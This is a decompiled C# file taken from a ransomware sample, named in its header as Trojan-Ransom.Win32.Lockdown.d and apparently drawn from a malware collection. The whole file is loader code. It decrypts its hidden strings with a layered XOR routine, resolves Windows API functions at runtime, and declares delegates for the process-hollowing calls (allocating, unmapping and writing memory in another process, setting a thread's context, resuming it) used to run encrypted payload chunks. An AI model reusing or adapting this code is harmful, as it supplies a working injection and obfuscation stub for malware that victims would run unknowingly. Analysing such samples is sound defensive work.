// Decompiled with JetBrains decompiler
// Type: fQxuTtw.ClaZx
// Assembly: w3cschools, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8B4F2215-C995-4D30-A696-23B90444E6B9
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Lockdown.d-2160436077daf6f63cb09072b3c7e1d7a6b32372032ebc76ebed5892946c2ed1.exe

using System;
using System.Runtime.InteropServices;

namespace fQxuTtw
{
  public class ClaZx
  {
    public static string namenorm;
    public static string namenet;
    public static string eofstr;
    public static string otfiles;
    public static string downex;
    public static string visitwebsites;
    public static string startupstring;
    public static string ExtraSt;
    private static byte[] startupbytes = (byte[]) null;
    private static string[] spls = new string[1]
    {
      "xVlVxqkTpPDvOfIPDYIr"
    };
    public static string appdat;
    public static string fileNamex;
    public static string[] extrastrings;
    public static string Pthzz;
    public static IntPtr Gepoad;
    public static Type Teaz;
    public static object obj;
    private static IntPtr Hmod;
    private static string method2;

    public static void Arraycopy(byte[] exeBuffer, int toint, byte[] imshea) => Array.Copy((Array) exeBuffer, toint, (Array) imshea, 0, imshea.Length);

    private static int xorer(int input1, int input2)
    {
      input1 ^= input2;
      return input1;
    }

    public static byte[] enCode(byte[] mesgg, byte[] Keyyy)
    {
      byte[] numArray = (byte[]) mesgg.Clone();
      for (int index1 = 0; index1 < 5; ++index1)
      {
        for (int index2 = 0; index2 < numArray.Length; ++index2)
        {
          numArray[index2] = (byte) ClaZx.xorer((int) numArray[index2], (int) Keyyy[index2 % Keyyy.Length]);
          for (int input2_1 = 0; input2_1 < Keyyy.Length; ++input2_1)
          {
            int input2_2 = ClaZx.xorer((int) Keyyy[input2_1] << index1, input2_1) + index2;
            numArray[index2] = (byte) ClaZx.xorer((int) numArray[index2], input2_2);
          }
        }
      }
      return numArray;
    }

    private static void Main(string[] args)
    {
      Memex.CLOZ();
      ClaZx.appdat = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      ClaZx.Trilogy();
    }

    private static void decrs()
    {
      try
      {
        ClaZx.namenorm = Memex.CCC(ClaZx.namenorm);
        ClaZx.namenet = Memex.CCC(ClaZx.namenet);
        ClaZx.eofstr = Memex.CCC(ClaZx.eofstr);
        ClaZx.otfiles = Memex.CCC(ClaZx.otfiles);
        ClaZx.downex = Memex.CCC(ClaZx.downex);
        ClaZx.visitwebsites = Memex.CCC(ClaZx.visitwebsites);
        ClaZx.extrastrings = Memex.CCC(ClaZx.ExtraSt).Split('|');
      }
      catch
      {
      }
    }

    public static void Trilogy()
    {
      try
      {
        ClaZx.startupbytes = ClaZx.enCode(Memex.BBB(ClaZx.startupstring), Memex.BBB(Memex.pass));
      }
      catch
      {
      }
      ClaZx.decrs();
      if (!(ClaZx.namenorm != string.Empty))
        return;
      ClaZx.fileNamex = ClaZx.extrastrings[9];
      foreach (string s in ClaZx.namenorm.Split(ClaZx.spls, StringSplitOptions.RemoveEmptyEntries))
      {
        try
        {
          Memex.Runoa(Memex.BBB(s), ClaZx.fileNamex);
        }
        catch
        {
        }
      }
    }

    private static int RandomNumber(int minnn, int maxxx)
    {
      Random random = new Random();
      if (minnn == 1)
        ClaZx.Gepoad = ClaZx.GetProcAddress(ClaZx.Hmod, ClaZx.method2);
      return random.Next(minnn, maxxx);
    }

    public static T CreateAPI<T>(string name, string method)
    {
      ClaZx.Hmod = ClaZx.LoadLibraryA(name);
      ClaZx.method2 = method;
      ClaZx.RandomNumber(1, 26);
      ClaZx.Teaz = typeof (T);
      Memex.ZOL();
      return (T) ClaZx.obj;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibraryA(string lpFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateProcess(
      string lpApplicationName,
      string lpCommandLine,
      IntPtr lpProcessAttributes,
      IntPtr lpThreadAttributes,
      bool bInheritHandles,
      uint dwCreationFlags,
      IntPtr lpEnvironment,
      string lpCurrentDirectory,
      byte[] lpStartupInfo,
      int[] lpProcessInfo);

    public delegate IntPtr pBhpkEzwcPDh(
      IntPtr hProcess,
      IntPtr lpAddress,
      uint dwSize,
      uint flAllocationType,
      uint flProtect);

    public delegate uint JywoSMKsxxae(IntPtr hProcess, IntPtr lpBaseAddress);

    public delegate int igQiXSlVkUiZ(
      IntPtr hProcess,
      IntPtr lpBaseAddress,
      IntPtr lpBuffer,
      uint nSize,
      IntPtr lpNumberOfBytesWritten);

    public delegate int jzNRdJaAITlI(IntPtr hThread, IntPtr lpContext);

    public delegate int tDVuAiMQBdge(IntPtr hThread, IntPtr lpContext);

    public delegate uint OrykDIXOqwes(IntPtr hThread, IntPtr SuspendCount);
  }
}
